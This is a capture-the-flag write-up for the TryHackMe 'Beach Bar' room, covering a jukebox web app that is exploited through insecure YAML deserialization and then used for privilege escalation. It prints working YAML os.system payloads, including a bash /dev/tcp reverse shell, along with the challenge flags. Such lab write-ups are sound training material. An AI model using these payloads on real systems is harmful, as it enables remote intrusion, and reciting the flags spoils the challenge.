# Beach Bar

## Category

Boot2Root

## Points

60

## Difficulty

Easy

## Overview

Beach Bar is a web-based boot2root challenge from TryHackMe Hacker Holidays. The target is a beach bar jukebox application where users can submit song requests. The application appears simple at first, but enumeration reveals that the jukebox accepts more than normal song data.

The goal is to exploit the web application, gain a shell on the machine, read the user flag, then escalate privileges to retrieve the root flag.

---

## Challenge Description

The Byte Lotus beach bar has a public jukebox system that takes requests from guests. The challenge description hints at a service that was shipped quickly and left with insecure functionality.

Important clues from the briefing:

- The jukebox takes requests from anyone.
- The song queue accepts more than just song titles.
- A service is quietly announcing something.
- The developer left dangerous “trimmings” attached.

These clues suggest insecure input handling and possible service misconfiguration.

---

## Room Access

```text
http://MACHINE_IP
```

---

## Objectives

The objectives are:

1. Find the user flag.
2. Find the root flag.

---

## Initial Enumeration

First, I started with a basic Nmap scan.

```bash
nmap -sC -sV -oN nmap.txt MACHINE_IP
```

The scan showed a web service running on the target. I opened the website in the browser and found a beach bar jukebox application.

The web application allowed users to submit playlist or song request data.

---

## Web Enumeration

After exploring the website, I checked the available pages and functionality. The important feature was the jukebox request/playlist system.

Directory enumeration can also be used to discover hidden paths:

```bash
gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirb/common.txt
```

The application behavior suggested that submitted playlist data was being processed by the backend.

---

## Key Finding

The jukebox application was vulnerable because it processed user-controlled YAML input insecurely.

YAML can be dangerous when parsed with unsafe functions in Python, such as `yaml.load()` with an unsafe loader. If the backend parses untrusted YAML insecurely, an attacker can abuse Python-specific YAML tags to execute system commands.

This allowed remote command execution on the server.

---

## Exploitation

To confirm command execution, I submitted a YAML payload that executed a simple command.

Example payload:

```yaml
!!python/object/apply:os.system ["id"]
```

After confirming that command execution was possible, I prepared a reverse shell.

On my attacking machine, I started a Netcat listener:

```bash
nc -lvnp 4444
```

Then I submitted a reverse shell payload through the vulnerable jukebox input.

Example payload:

```yaml
!!python/object/apply:os.system [
  "bash -c 'bash -i >& /dev/tcp/YOUR_TUN0_IP/4444 0>&1'",
]
```

After the payload was processed, I received a shell on the target machine.

---

## Shell Stabilization

After receiving the reverse shell, I upgraded it for easier interaction.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then:

```bash
export TERM=xterm
```

I also backgrounded the shell with `Ctrl + Z` and ran:

```bash
stty raw -echo; fg
```

---

## User Flag

After getting a shell, I checked the current user and explored the home directories.

```bash
whoami
pwd
ls -la
```

The user flag was found in the user’s home directory.

```bash
cat user.txt
```

User flag:

```text
THM{y4ml_pl4yl1st_pwns_th3_b34ch}
```

---

## Privilege Escalation Enumeration

After getting the user flag, I started local enumeration to look for privilege escalation paths.

Useful commands included:

```bash
sudo -l
```

```bash
find / -perm -4000 -type f 2>/dev/null
```

```bash
find / -writable -type d 2>/dev/null
```

```bash
ps aux
```

```bash
systemctl list-units --type=service
```

The challenge description mentioned a service “quietly announcing something,” so I focused on services and application files.

---

## Service Investigation

The jukebox application was running as a service. I inspected the related service configuration and application directory.

Common locations to check:

```bash
ls -la /opt
ls -la /etc/systemd/system
systemctl status jukeboxd
```

Service files can sometimes contain sensitive information such as credentials, environment variables, paths, or unsafe startup commands.

I inspected the service configuration:

```bash
cat /etc/systemd/system/jukeboxd.service
```

This revealed useful information related to the jukebox service and helped identify the privilege escalation path.

---

## Root Access

Using the information discovered from the service configuration and application files, I escalated privileges and gained access to the root-owned flag.

After gaining the required privilege, I read the root flag:

```bash
cat /root/root.txt
```

Root flag:

```text
THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
```

---

## Vulnerability Explanation

This machine involved two main issues:

### 1. Insecure YAML Deserialization

The web application accepted user-controlled YAML and parsed it unsafely. This allowed Python object tags to execute system commands on the server.

This led to remote command execution and an initial shell.

### 2. Service Misconfiguration

After gaining the initial shell, service files and application configuration exposed useful information for privilege escalation.

Poorly protected service configurations can leak credentials or reveal unsafe execution paths.

---

## Root Cause

The root cause was insecure backend design and weak system hardening.

The application trusted user input and processed it using unsafe deserialization. In addition, sensitive service configuration was accessible or useful to a low-privileged user.

---

## Impact

An attacker could:

- Execute commands on the server.
- Gain an initial shell.
- Read the user flag.
- Enumerate local services and configuration.
- Escalate privileges.
- Read the root flag.

---

## Lessons Learned

- Never parse untrusted YAML with unsafe loaders.
- Avoid using dangerous deserialization functions on user input.
- Web applications should validate and sanitize all submitted data.
- Service files should not expose sensitive credentials.
- Application secrets should not be stored in readable configuration files.
- Privilege escalation often depends on careful local enumeration.

---

## Mitigation

To prevent this type of attack:

1. Use safe YAML parsing, such as `yaml.safe_load()`.
2. Avoid accepting raw YAML from untrusted users.
3. Validate playlist or song request input strictly.
4. Run web applications with the least privilege required.
5. Protect service files and environment variables.
6. Do not store credentials in systemd service files.
7. Regularly audit services, permissions, and application directories.
8. Monitor for suspicious reverse shell activity.

---

## Conclusion

Beach Bar demonstrated how a simple jukebox feature can become dangerous when user input is processed insecurely. By abusing unsafe YAML deserialization, it was possible to execute commands and gain a shell on the target.

Further enumeration of services and configuration files allowed privilege escalation and access to the root flag. The challenge highlights the importance of secure input handling and proper Linux service hardening.
